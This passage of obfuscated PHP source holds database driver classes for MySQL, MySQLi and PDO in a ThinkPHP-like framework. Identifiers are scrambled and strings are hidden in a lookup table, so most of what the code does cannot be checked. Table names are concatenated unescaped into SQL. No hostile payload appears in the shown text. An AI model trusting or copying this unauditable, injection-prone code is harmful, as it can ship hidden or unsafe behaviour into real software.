if ($this->transTimes == 0) { mysql_query($_SERVER[¤øïŠ‹²][1007], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $—ñƒ´°ü = mysql_query($_SERVER[¤øïŠ‹²][1008], $this->_linkID); $this->transTimes = 0; if (!$—ñƒ´°ü) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $èœ‡úÂ = mysql_query($_SERVER[¤øïŠ‹²][1009], $this->_linkID); $this->transTimes = 0; if (!$èœ‡úÂ) { $this->error(); return !1; } } return !0; } private function getAll() { $ûˆ­ÅÊ = array(); if ($this->numRows > 0) { while ($¸ÛµÒ†Ë = mysql_fetch_assoc($this->queryID)) { $ûˆ­ÅÊ[] = $¸ÛµÒ†Ë; } mysql_data_seek($this->queryID, 0); } return $ûˆ­ÅÊ; } public function getFields($™Ó“óß¦) { $Ç×€ôÑ„ =& $_SERVER[¤øïŠ‹²]; $ú£¦ŸİÀ = $this->query($Ç×€ôÑ„[1010] . $this->parseKey($™Ó“óß¦)); $á›öäÚ = array(); if ($ú£¦ŸİÀ) { foreach ($ú£¦ŸİÀ as $Ê€‡õ†Ó => $Ç‘ïè) { $á›öäÚ[$Ç‘ïè[$Ç×€ôÑ„[31]]] = array($Ç×€ôÑ„[32] => $Ç‘ïè[$Ç×€ôÑ„[31]], $Ç×€ôÑ„[33] => $Ç‘ïè[$Ç×€ôÑ„[34]], $Ç×€ôÑ„[35] => (bool) (strtoupper($Ç‘ïè[$Ç×€ôÑ„[36]]) === $Ç×€ôÑ„[1011]), $Ç×€ôÑ„[37] => $Ç‘ïè[$Ç×€ôÑ„[38]], $Ç×€ôÑ„[39] => strtolower($Ç‘ïè[$Ç×€ôÑ„[40]]) == $Ç×€ôÑ„[41], $Ç×€ôÑ„[42] => strtolower($Ç‘ïè[$Ç×€ôÑ„[43]]) == $Ç×€ôÑ„[44]); } } return $á›öäÚ; } public function getTables($à¤¸ƒí¤ = '') { $ââ•…›³ =& $_SERVER[¤øïŠ‹²]; if (!empty($à¤¸ƒí¤)) { $úÛîï‡ = $ââ•…›³[1012] . $à¤¸ƒí¤ . $ââ•…›³[1013]; } else { $úÛîï‡ = $ââ•…›³[1014]; } $ı‚‚Ï©Ä = $this->query($úÛîï‡); $ùé›Õ = array(); foreach ($ı‚‚Ï©Ä as $ªò¸øŠ± => $ŸŠ´Ú¦í) { $ùé›Õ[$ªò¸øŠ±] = current($ŸŠ´Ú¦í); } return $ùé›Õ; } public function replace($¤³ˆû’, $Ö‚ôæŒ„ = array()) { $ûİóï… =& $_SERVER[¤øïŠ‹²]; foreach ($¤³ˆû’ as $ú¤€öß¥ => $®¡ã•É) { $Ó›ìÔ»„ = $this->parseValue($®¡ã•É); if (is_scalar($Ó›ìÔ»„)) { $‘“šØ¸¤[] = $Ó›ìÔ»„; $„”…Ë”È[] = $this->parseKey($ú¤€öß¥); } } $ïœÒÍì„ = $ûİóï…[1015] . $this->parseTable($Ö‚ôæŒ„[$ûİóï…[369]]) . $ûİóï…[1016] . implode($ûİóï…[50], $„”…Ë”È) . $ûİóï…[1017] . implode($ûİóï…[50], $‘“šØ¸¤) . $ûİóï…[1018]; return $this->execute($ïœÒÍì„); } public function insertAll($½ùÜõÁù, $¤ÅùÕŞ“ = array(), $â÷Ôİ¸Ì = false) { $íæûÔ¡ğ =& $_SERVER[¤øïŠ‹²]; if (!is_array($½ùÜõÁù[0])) { return !1; } $–Ä–âğ = array_keys($½ùÜõÁù[0]); $îğë¯ƒ = array(); foreach ($½ùÜõÁù as $¦•û—®¶) { $éñµ´ã¼ = array(); foreach ($¦•û—®¶ as $ŠòÙ‘ªà => $òÌƒ¯¡§) { $òÌƒ¯¡§ = $this->parseValue($òÌƒ¯¡§); if (is_scalar($òÌƒ¯¡§)) { $éñµ´ã¼[] = $òÌƒ¯¡§; } } $îğë¯ƒ[] = $íæûÔ¡ğ[349] . implode($íæûÔ¡ğ[50], $éñµ´ã¼) . $íæûÔ¡ğ[1018]; } array_walk($–Ä–âğ, array($this, $íæûÔ¡ğ[1019])); $‡»ğß–’ = $â÷Ôİ¸Ì ? $íæûÔ¡ğ[1020] : $íæûÔ¡ğ[1021]; $‡»ğß–’ = $íæûÔ¡ğ[1021]; $´ª¦«î® = $‡»ğß–’ . $íæûÔ¡ğ[1022] . $this->parseTable($¤ÅùÕŞ“[$íæûÔ¡ğ[369]]) . $íæûÔ¡ğ[1016] . implode($íæûÔ¡ğ[50], $–Ä–âğ) . $íæûÔ¡ğ[1023] . implode($íæûÔ¡ğ[50], $îğë¯ƒ); if ($â÷Ôİ¸Ì) { $ıàÚÓºÛ = array(); foreach ($–Ä–âğ as $ŠòÙ‘ªà) { if ($ŠòÙ‘ªà == $íæûÔ¡ğ[244] || $ŠòÙ‘ªà == $íæûÔ¡ğ[1024]) { continue; } $ıàÚÓºÛ[] = $ŠòÙ‘ªà . $íæûÔ¡ğ[1025] . $ŠòÙ‘ªà . $íæûÔ¡ğ[1018]; } $´ª¦«î® .= $íæûÔ¡ğ[1026] . implode($íæûÔ¡ğ[50], $ıàÚÓºÛ); } return $this->execute($´ª¦«î®); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÂªÑã»˜ =& $_SERVER[¤øïŠ‹²]; $this->error = mysql_errno() . $ÂªÑã»˜[4] . mysql_error($this->_linkID); if ($ÂªÑã»˜[12] != $this->queryStr) { $this->error .= LNG($ÂªÑã»˜[48]) . $this->queryStr; } think_trace($this->error, $ÂªÑã»˜[12], $ÂªÑã»˜[49]); return $this->error; } public function escapeString($œç‰ô»ø) { if ($this->_linkID) { return mysql_real_escape_string($œç‰ô»ø, $this->_linkID); } else { return mysql_escape_string($œç‰ô»ø); } } public function parseKey(&$ºê¢Ùâí, $ÁÑ©ä¶ = true) { $ŸÄ‘ù¼º =& $_SERVER[¤øïŠ‹²]; if ($ÁÑ©ä¶) { $ºê¢Ùâí = $this->parseKeyCheck($ºê¢Ùâí); } if ($ºê¢Ùâí != $ŸÄ‘ù¼º[233] && !preg_match($ŸÄ‘ù¼º[1027], $ºê¢Ùâí)) { $ºê¢Ùâí = $ŸÄ‘ù¼º[482] . trim($ºê¢Ùâí, $ŸÄ‘ù¼º[482]) . $ŸÄ‘ù¼º[482]; } return $ºê¢Ùâí; } } class DbMysqli extends Db { public function __construct($ã£ú…áœ = '') { $üî¤”ñÏ =& $_SERVER[¤øïŠ‹²]; if (!extension_loaded($üî¤”ñÏ[1028])) { think_exception(think_lang($üî¤”ñÏ[14]) . $üî¤”ñÏ[1029]); } if (!empty($ã£ú…áœ)) { $this->config = $ã£ú…áœ; if (empty($this->config[$üî¤”ñÏ[17]])) { $this->config[$üî¤”ñÏ[17]] = $üî¤”ñÏ[12]; } } } public function connect($ ¢‰ç™¼ = '', $ÌıĞ­ß± = 0) { $ùúÑ“Û¸ =& $_SERVER[¤øïŠ‹²]; if (!isset($this->linkID[$ÌıĞ­ß±])) { if (empty($ ¢‰ç™¼)) { $ ¢‰ç™¼ = $this->config; } $this->linkID[$ÌıĞ­ß±] = new mysqli($ ¢‰ç™¼[$ùúÑ“Û¸[999]], $ ¢‰ç™¼[$ùúÑ“Û¸[1001]], $ ¢‰ç™¼[$ùúÑ“Û¸[1002]], $ ¢‰ç™¼[$ùúÑ“Û¸[21]], $ ¢‰ç™¼[$ùúÑ“Û¸[1000]] ? intval($ ¢‰ç™¼[$ùúÑ“Û¸[1000]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $”ñïíæ„ = $this->linkID[$ÌıĞ­ß±]->server_version; $this->linkID[$ÌıĞ­ß±]->query($ùúÑ“Û¸[1003] . think_config($ùúÑ“Û¸[1004]) . $ùúÑ“Û¸[68]); if ($”ñïíæ„ > $ùúÑ“Û¸[1005]) { $this->linkID[$ÌıĞ­ß±]->query($ùúÑ“Û¸[1006]); } $this->connected = !0; if (1 != think_config($ùúÑ“Û¸[22])) { unset($this->config); } } return $this->linkID[$ÌıĞ­ß±]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($±×„óÉÒ) { $òûˆ‚™­ =& $_SERVER[¤øïŠ‹²]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $±×„óÉÒ; if ($this->queryID) { $this->free(); } think_action_status($òûˆ‚™­[23], 1); think_status($òûˆ‚™­[24]); $this->queryID = $this->_linkID->query($±×„óÉÒ); if ($this->_linkID->more_results()) { while (($‰¨¶Ô±ö = $this->_linkID->next_result()) != NULL) { $‰¨¶Ô±ö->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÊÌÅ–¶ü) { $¢—àĞ® =& $_SERVER[¤øïŠ‹²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÊÌÅ–¶ü; if ($this->queryID) { $this->free(); } think_action_status($¢—àĞ®[25], 1); think_status($¢—àĞ®[24]); $“ „•±ä = $this->_linkID->query($ÊÌÅ–¶ü); $this->debug(); if (!1 === $“ „•±ä) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ô¼»“ıï = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ô¼»“ıï) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $»–Ô¢ÃŸ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$»–Ô¢ÃŸ) { $this->error(); return !1; } } return !0; } private function getAll() { $í„ø»ÉÎ = array(); if ($this->numRows > 0) { for ($ÏæÑ‡’ = 0; $ÏæÑ‡’ < $this->numRows; $ÏæÑ‡’++) { $í„ø»ÉÎ[$ÏæÑ‡’] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $í„ø»ÉÎ; } public function getFields($àó˜ãô) { $Ã±èŠ´© =& $_SERVER[¤øïŠ‹²]; $¦ £ÜøÒ = $this->query($Ã±èŠ´©[1010] . $this->parseKey($àó˜ãô)); $¸À¢„­ = array(); if ($¦ £ÜøÒ) { foreach ($¦ £ÜøÒ as $¦î¯‚“ü => $„°»‹ªÎ) { $¸À¢„­[$„°»‹ªÎ[$Ã±èŠ´©[31]]] = array($Ã±èŠ´©[32] => $„°»‹ªÎ[$Ã±èŠ´©[31]], $Ã±èŠ´©[33] => $„°»‹ªÎ[$Ã±èŠ´©[34]], $Ã±èŠ´©[35] => (bool) ($„°»‹ªÎ[$Ã±èŠ´©[36]] === $Ã±èŠ´©[12]), $Ã±èŠ´©[37] => $„°»‹ªÎ[$Ã±èŠ´©[38]], $Ã±èŠ´©[39] => strtolower($„°»‹ªÎ[$Ã±èŠ´©[40]]) == $Ã±èŠ´©[41], $Ã±èŠ´©[42] => strtolower($„°»‹ªÎ[$Ã±èŠ´©[43]]) == $Ã±èŠ´©[44]); } } return $¸À¢„­; } public function getTables($Ù†šËÌ÷ = '') { $÷Ô“â‚Æ =& $_SERVER[¤øïŠ‹²]; $Á ½Ò‡ï = !empty($Ù†šËÌ÷) ? $÷Ô“â‚Æ[1012] . $Ù†šËÌ÷ . $÷Ô“â‚Æ[1013] : $÷Ô“â‚Æ[1014]; $¤¿ù’Ö„ = $this->query($Á ½Ò‡ï); $şğ‰ÑßÙ = array(); if ($¤¿ù’Ö„) { foreach ($¤¿ù’Ö„ as $êŠëêš• => $òõšá¹) { $şğ‰ÑßÙ[$êŠëêš•] = current($òõšá¹); } } return $şğ‰ÑßÙ; } public function replace($Ô²„­ò, $Ô”î¿Œ· = array()) { $»¼Ç¥ÓÏ =& $_SERVER[¤øïŠ‹²]; foreach ($Ô²„­ò as $Òá£™ïÖ => $ŠÙé±Éˆ) { $´œ÷šö‘ = $this->parseValue($ŠÙé±Éˆ); if (is_scalar($´œ÷šö‘)) { $ óß‘ÉÂ[] = $´œ÷šö‘; $¼„İ÷Ô[] = $this->parseKey($Òá£™ïÖ); } } $¶¡´Øä¨ = $»¼Ç¥ÓÏ[1015] . $this->parseTable($Ô”î¿Œ·[$»¼Ç¥ÓÏ[369]]) . $»¼Ç¥ÓÏ[1016] . implode($»¼Ç¥ÓÏ[50], $¼„İ÷Ô) . $»¼Ç¥ÓÏ[1017] . implode($»¼Ç¥ÓÏ[50], $ óß‘ÉÂ) . $»¼Ç¥ÓÏ[1018]; return $this->execute($¶¡´Øä¨); } public function insertAll($£…„”´ƒ, $åÜÉø‡ß = array(), $âöÆÑ = false) { $üûûœª° =& $_SERVER[¤øïŠ‹²]; if (!is_array($£…„”´ƒ[0])) { return !1; } $ƒ×É‡ = array_keys($£…„”´ƒ[0]); $È‹®ñƒ = array(); foreach ($£…„”´ƒ as $Ä ù¸Š) { $ûíÃ’§Å = array(); foreach ($Ä ù¸Š as $›™Ë§í => $ğ…®—¤ì) { $ğ…®—¤ì = $this->parseValue($ğ…®—¤ì); if (is_scalar($ğ…®—¤ì)) { $ûíÃ’§Å[] = $ğ…®—¤ì; } } $È‹®ñƒ[] = $üûûœª°[349] . implode($üûûœª°[50], $ûíÃ’§Å) . $üûûœª°[1018]; } array_walk($ƒ×É‡, array($this, $üûûœª°[1019])); $Ùñ¾…ä = $âöÆÑ ? $üûûœª°[1020] : $üûûœª°[1021]; $Ùñ¾…ä = $üûûœª°[1021]; $ëØñ¾² = $Ùñ¾…ä . $üûûœª°[1022] . $this->parseTable($åÜÉø‡ß[$üûûœª°[369]]) . $üûûœª°[1016] . implode($üûûœª°[50], $ƒ×É‡) . $üûûœª°[1023] . implode($üûûœª°[50], $È‹®ñƒ); if ($âöÆÑ) { $˜·ó„° = array(); foreach ($ƒ×É‡ as $›™Ë§í) { if ($›™Ë§í == $üûûœª°[244] || $›™Ë§í == $üûûœª°[1024]) { continue; } $˜·ó„°[] = $›™Ë§í . $üûûœª°[1025] . $›™Ë§í . $üûûœª°[1018]; } $ëØñ¾² .= $üûûœª°[1026] . implode($üûûœª°[50], $˜·ó„°); } return $this->execute($ëØñ¾²); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $’à€¸Å‚ =& $_SERVER[¤øïŠ‹²]; $this->error = $this->_linkID->errno . $’à€¸Å‚[4] . $this->_linkID->error; if ($’à€¸Å‚[12] != $this->queryStr) { $this->error .= LNG($’à€¸Å‚[48]) . $this->queryStr; } think_trace($this->error, $’à€¸Å‚[12], $’à€¸Å‚[49]); return $this->error; } public function escapeString($­öò³åñ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($­öò³åñ); } else { return addslashes($­öò³åñ); } } public function parseKey(&$¿Ô²Åñ, $‡›ÚÕéó = true) { $©—’çÑô =& $_SERVER[¤øïŠ‹²]; if ($‡›ÚÕéó) { $¿Ô²Åñ = $this->parseKeyCheck($¿Ô²Åñ); } if ($¿Ô²Åñ != $©—’çÑô[233] && !preg_match($©—’çÑô[1027], $¿Ô²Åñ)) { $¿Ô²Åñ = $©—’çÑô[482] . trim($¿Ô²Åñ, $©—’çÑô[482]) . $©—’çÑô[482]; } return $¿Ô²Åñ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($•€´®½£ = '') { $Ğàß’Ä‚ =& $_SERVER[¤øïŠ‹²]; if (!class_exists($Ğàß’Ä‚[1030])) { think_exception(think_lang($Ğàß’Ä‚[14]) . $Ğàß’Ä‚[1031]); } if (!empty($•€´®½£)) { $this->config = $•€´®½£; if (empty($this->config[$Ğàß’Ä‚[17]])) { $this->config[$Ğàß’Ä‚[17]] = array(); } } } public function connect($ÚÈö·Ã = '', $ƒèã«ş = 0) { $ÜË£âìÃ =& $_SERVER[¤øïŠ‹²]; if (!isset($this->linkID[$ƒèã«ş])) { if (empty($ÚÈö·Ã)) { $ÚÈö·Ã = $this->config; } $—‚ª¨¶› = !empty($ÚÈö·Ã[$ÜË£âìÃ[17]][$ÜË£âìÃ[18]]) ? $ÚÈö·Ã[$ÜË£âìÃ[17]][$ÜË£âìÃ[18]] : $this->pconnect; if ($—‚ª¨¶›) { $ÚÈö·Ã[$ÜË£âìÃ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ƒèã«ş] = new PDO($ÚÈö·Ã[$ÜË£âìÃ[1032]], $ÚÈö·Ã[$ÜË£âìÃ[1001]], $ÚÈö·Ã[$ÜË£âìÃ[1002]], $ÚÈö·Ã[$ÜË£âìÃ[17]]); } catch (PDOException $ÑµóØ÷) { think_exception($ÑµóØ÷->getMessage()); } $this->dbType = $this->_getDsnType($ÚÈö·Ã[$ÜË£âìÃ[1032]]); if (in_array($this->dbType, array($ÜË£âìÃ[1033], $ÜË£âìÃ[1034], $ÜË£âìÃ[1035], $ÜË£âìÃ[1036]))) { think_exception($ÜË£âìÃ[1037] . $this->dbType . $ÜË£âìÃ[1038] . $this->dbType . $ÜË£âìÃ[1039]); } if (!$this->linkID[$ƒèã«ş]) { think_exception($ÜË£âìÃ[1040]); } try { $this->linkID[$ƒèã«ş]->exec($ÜË£âìÃ[1041] . think_config($ÜË£âìÃ[1004])); } catch (Exception $ÑµóØ÷) { } $this->connected = !0; if (1 != think_config($ÜË£âìÃ[22])) { unset($this->config); } } return $this->linkID[$ƒèã«ş]; } public function free() { $this->PDOStatement = null; } public function query($çö‘­ƒ‘, $·ğò¶Ğ¿ = array()) { $öÖŞªİë =& $_SERVER[¤øïŠ‹²]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $çö‘­ƒ‘; if (!empty($·ğò¶Ğ¿)) { $this->queryStr .= $öÖŞªİë[1042] . print_r($·ğò¶Ğ¿, !0) . $öÖŞªİë[1043]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($öÖŞªİë[23], 1); think_status($öÖŞªİë[24]); $this->PDOStatement = $this->_linkID->prepare($çö‘­ƒ‘); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Íøñ•© = $this->PDOStatement->execute($·ğò¶Ğ¿); $this->debug(); if (!1 === $Íøñ•©) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($‹ô•Éğû, $›ˆïÔ° = array()) { $İ¾–°ë¤ =& $_SERVER[¤øïŠ‹²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‹ô•Éğû; if (!empty($›ˆïÔ°)) { $this->queryStr .= $İ¾–°ë¤[1042] . print_r($›ˆïÔ°, !0) . $İ¾–°ë¤[1043]; } $ßÙ¤º€¯ = !1; if ($this->dbType == $İ¾–°ë¤[1036]) { if (preg_match($İ¾–°ë¤[1044], $this->queryStr, $Û€¾²ºı)) { $this->table = think_config($İ¾–°ë¤[1045]) . str_ireplace(think_config($İ¾–°ë¤[1046]), $İ¾–°ë¤[63], $Û€¾²ºı[2]); $ßÙ¤º€¯ = (bool) $this->query($İ¾–°ë¤[1047] . strtoupper($this->table) . $İ¾–°ë¤[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($İ¾–°ë¤[25], 1); think_status($İ¾–°ë¤[24]); $this->PDOStatement = $this->_linkID->prepare($‹ô•Éğû); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÔöúË¢ = $this->PDOStatement->execute($›ˆïÔ°); $this->debug(); if (!1 === $ÔöúË¢) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ßÙ¤º€¯ || preg_match($İ¾–°ë¤[1048], $‹ô•Éğû)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ß¯­Âİ§ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ß¯­Âİ§) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÎÎ¤¶»¤ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÎÎ¤¶»¤) { $this->error(); return !1; } } return !0; } private function getAll() { $“ÔË½ß = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($“ÔË½ß); return $“ÔË½ß; } public function getFields($êªÉ¤Ä½) { $Ïª¨ŒÕÎ =& $_SERVER[¤øïŠ‹²]; $this->initConnect(!0); if (think_config($Ïª¨ŒÕÎ[1049])) { $ïÂØõœé = str_replace($Ïª¨ŒÕÎ[1050], $êªÉ¤Ä½, think_config($Ïª¨ŒÕÎ[1049])); } else { switch ($this->dbType) { case $Ïª¨ŒÕÎ[1033]: case $Ïª¨ŒÕÎ[1051]: $ïÂØõœé = "\x53\x45\x4c\105\103\x54\x20\40\40\x63\x6f\x6c\x75\155\156\x5f\x6e\141\155\145\40\x61\163\40\47\116\x61\x6d\x65\47\54\40\40\x20\144\141\164\141\x5f\x74\171\x70\145\x20\x61\x73\x20\47\x54\171\160\145\47\54\40\x20\x20\x63\x6f\154\165\155\x6e\137\144\145\x66\141\x75\x6c\164\40\x61\x73\40\x27\104\145\x66\141\x75\154\x74\47\54\x20\x20\x20\151\163\137\156\165\154\x6c\141\x62\154\145\x20\x61\x73\40\47\x4e\x75\154\154\47\xa\11\11\x46\122\117\115\x9\x69\156\146\157\x72\155\141\164\x69\157\x6e\137\163\x63\150\x65\155\141\56\x74\141\x62\x6c\145\x73\x20\x41\x53\40\164\xa\x9\x9\112\117\x49\116\x9\151\156\x66\157\x72\x6d\x61\x74\x69\157\x6e\x5f\x73\x63\150\145\155\141\x2e\x63\157\154\x75\x6d\x6e\x73\40\101\x53\x20\143\12\11\11\x4f\x4e\40\40\x74\56\x74\x61\142\x6c\x65\x5f\x63\x61\x74\141\x6c\157\x67\40\x3d\x20\143\x2e\164\141\142\x6c\x65\137\143\x61\x74\141\154\x6f\x67\12\11\x9\x41\x4e\x44\x20\x74\56\x74\141\x62\x6c\x65\137\163\143\150\x65\155\x61\40\x3d\x20\143\56\164\x61\x62\154\145\137\x73\x63\150\x65\x6d\x61\xa\x9\11\x41\116\104\x20\164\56\164\141\x62\154\x65\x5f\156\141\155\145\x20\75\x20\143\56\x74\x61\142\x6c\145\x5f\x6e\141\155\145\12\x9\11\x57\x48\x45\x52\x45\x20\40\40\164\56\164\x61\142\x6c\x65\x5f\156\141\155\145\40\x3d\x20\47{$êªÉ¤Ä½}\47"; break; case $Ïª¨ŒÕÎ[1052]: $ïÂØõœé = $Ïª¨ŒÕÎ[1053] . $êªÉ¤Ä½ . $Ïª¨ŒÕÎ[1054]; break; case $Ïª¨ŒÕÎ[1034]: case $Ïª¨ŒÕÎ[1036]: $ïÂØõœé = $Ïª¨ŒÕÎ[1055] . $Ïª¨ŒÕÎ[1056] . $Ïª¨ŒÕÎ[1057] . strtoupper($êªÉ¤Ä½) . $Ïª¨ŒÕÎ[1058] . strtoupper($êªÉ¤Ä½) . $Ïª¨ŒÕÎ[1059]; break; case $Ïª¨ŒÕÎ[1060]: $ïÂØõœé = $Ïª¨ŒÕÎ[1061] . $êªÉ¤Ä½ . $Ïª¨ŒÕÎ[1062]; break; case $Ïª¨ŒÕÎ[1035]: break; case $Ïª¨ŒÕÎ[1063]: default: $ïÂØõœé = $Ïª¨ŒÕÎ[1064] . ($this->dbType == $Ïª¨ŒÕÎ[1063] ? "\x60{$êªÉ¤Ä½}\x60" : $êªÉ¤Ä½); } } $¸Õ«„òŸ = $this->query($ïÂØõœé); $ş¨¯ííƒ = array(); if ($¸Õ«„òŸ) { foreach ($¸Õ«„òŸ as $Ş‘Ò–ü² => $§Ø³ÆÖ„) { $§Ø³ÆÖ„ = array_change_key_case($§Ø³ÆÖ„); $§Ø³ÆÖ„[$Ïª¨ŒÕÎ[32]] = isset($§Ø³ÆÖ„[$Ïª¨ŒÕÎ[32]]) ? $§Ø³ÆÖ„[$Ïª¨ŒÕÎ[32]] : $Ïª¨ŒÕÎ[63]; $§Ø³ÆÖ„[$Ïª¨ŒÕÎ[33]] = isset($§Ø³ÆÖ„[$Ïª¨ŒÕÎ[33]]) ? $§Ø³ÆÖ„[$Ïª¨ŒÕÎ[33]] : $Ïª¨ŒÕÎ[63]; $·ªø—Œ = isset($§Ø³ÆÖ„[$Ïª¨ŒÕÎ[363]]) ? $§Ø³ÆÖ„[$Ïª¨ŒÕÎ[363]] : $§Ø³ÆÖ„[$Ïª¨ŒÕÎ[32]]; $ş¨¯ííƒ[$·ªø—Œ] = array($Ïª¨ŒÕÎ[32] => $·ªø—Œ, $Ïª¨ŒÕÎ[33] => $§Ø³ÆÖ„[$Ïª¨ŒÕÎ[33]], $Ïª¨ŒÕÎ[35] => (bool) (isset($§Ø³ÆÖ„[$Ïª¨ŒÕÎ[115]]) && $§Ø³ÆÖ„[$Ïª¨ŒÕÎ[115]] === $Ïª¨ŒÕÎ[12] || isset($§Ø³ÆÖ„[$Ïª¨ŒÕÎ[35]]) && $§Ø³ÆÖ„[$Ïª¨ŒÕÎ[35]] === $Ïª¨ŒÕÎ[12]), $Ïª¨ŒÕÎ[37] => isset($§Ø³ÆÖ„[$Ïª¨ŒÕÎ[37]]) ? $§Ø³ÆÖ„[$Ïª¨ŒÕÎ[37]] : (isset($§Ø³ÆÖ„[$Ïª¨ŒÕÎ[66]]) ? $§Ø³ÆÖ„[$Ïª¨ŒÕÎ[66]] : $Ïª¨ŒÕÎ[63]), $Ïª¨ŒÕÎ[39] => isset($§Ø³ÆÖ„[$Ïª¨ŒÕÎ[106]]) ? strtolower($§Ø³ÆÖ„[$Ïª¨ŒÕÎ[106]]) == $Ïª¨ŒÕÎ[41] : (isset($§Ø³ÆÖ„[$Ïª¨ŒÕÎ[67]]) ? $§Ø³ÆÖ„[$Ïª¨ŒÕÎ[67]] : !1), $Ïª¨ŒÕÎ[42] => isset($§Ø³ÆÖ„[$Ïª¨ŒÕÎ[1065]]) ? strtolower($§Ø³ÆÖ„[$Ïª¨ŒÕÎ[1065]]) == $Ïª¨ŒÕÎ[44] : (isset($§Ø³ÆÖ„[$Ïª¨ŒÕÎ[106]]) ? $§Ø³ÆÖ„[$Ïª¨ŒÕÎ[106]] : !1)); } } return $ş¨¯ííƒ; } public function getTables($º—Á¾¢Ÿ = '') { $„ØûÒĞ =& $_SERVER[¤øïŠ‹²]; if (think_config($„ØûÒĞ[1066])) { $íÙ¶³ƒø = str_replace($„ØûÒĞ[1067], $º—Á¾¢Ÿ, think_config($„ØûÒĞ[1066])); } else { switch ($this->dbType) { case $„ØûÒĞ[1034]: case $„ØûÒĞ[1036]: $íÙ¶³ƒø = $„ØûÒĞ[1068]; break; case $„ØûÒĞ[1033]: case $„ØûÒĞ[1051]: $íÙ¶³ƒø = $„ØûÒĞ[1069]; break; case $„ØûÒĞ[1060]: $íÙ¶³ƒø = $„ØûÒĞ[1070]; break; case $„ØûÒĞ[1035]: think_exception(think_lang($„ØûÒĞ[1071]) . $„ØûÒĞ[1072]); break; case $„ØûÒĞ[1052]: $íÙ¶³ƒø = $„ØûÒĞ[45] . $„ØûÒĞ[46] . $„ØûÒĞ[47]; break; case $„ØûÒĞ[1063]: default: if (!empty($º—Á¾¢Ÿ)) { $íÙ¶³ƒø = $„ØûÒĞ[1012] . $º—Á¾¢Ÿ . $„ØûÒĞ[1013]; } else { $íÙ¶³ƒø = $„ØûÒĞ[1014]; } } } $ë”ëÀ³ = $this->query($íÙ¶³ƒø); $ØşÏ‡Äƒ = array(); foreach ($ë”ëÀ³ as $ ŒÄ¤œİ => $ÜÏ‰ôŞ·) { $ØşÏ‡Äƒ[$ ŒÄ¤œİ] = current($ÜÏ‰ôŞ·); } return $ØşÏ‡Äƒ; } protected function parseLimit($ßÛÇƒœ“) { $ÜêÜ¯ş˜ =& $_SERVER[¤øïŠ‹²]; $âñâí†ª = $ÜêÜ¯ş˜[12]; if (!empty($ßÛÇƒœ“)) { switch ($this->dbType) { case $ÜêÜ¯ş˜[1060]: case $ÜêÜ¯ş˜[1052]: $ßÛÇƒœ“ = explode($ÜêÜ¯ş˜[50], $ßÛÇƒœ“); if (count($ßÛÇƒœ“) > 1) { $âñâí†ª .= $ÜêÜ¯ş˜[51] . $ßÛÇƒœ“[1] . $ÜêÜ¯ş˜[52] . $ßÛÇƒœ“[0] . $ÜêÜ¯ş˜[53]; } else { $âñâí†ª .= $ÜêÜ¯ş˜[51] . $ßÛÇƒœ“[0] . $ÜêÜ¯ş˜[53]; } break; case $ÜêÜ¯ş˜[1033]: case $ÜêÜ¯ş˜[1051]: break; case $ÜêÜ¯ş˜[1035]: break; case $ÜêÜ¯ş˜[1034]: case $ÜêÜ¯ş˜[1036]: break; case $ÜêÜ¯ş˜[1063]: default: $âñâí†ª .= $ÜêÜ¯ş˜[51] . $ßÛÇƒœ“ . $ÜêÜ¯ş˜[53]; } } return $âñâí†ª; } public function parseKey(&$úàÜ¤è×, $ïÒÈ³æÌ = true) { $İ‘İğ¥² =& $_SERVER[¤øïŠ‹²]; if ($ïÒÈ³æÌ) { $úàÜ¤è× = $this->parseKeyCheck($úàÜ¤è×); } if ($this->dbType == $İ‘İğ¥²[1063]) { if ($úàÜ¤è× != $İ‘İğ¥²[233] && !preg_match($İ‘İğ¥²[1027], $úàÜ¤è×)) { $úàÜ¤è× = $İ‘İğ¥²[482] . trim($úàÜ¤è×, $İ‘İğ¥²[482]) . $İ‘İğ¥²[482]; } return $úàÜ¤è×; } else { return parent::parseKey($úàÜ¤è×, $ïÒÈ³æÌ); } } public function close() { $this->_linkID = null; } public function error() { 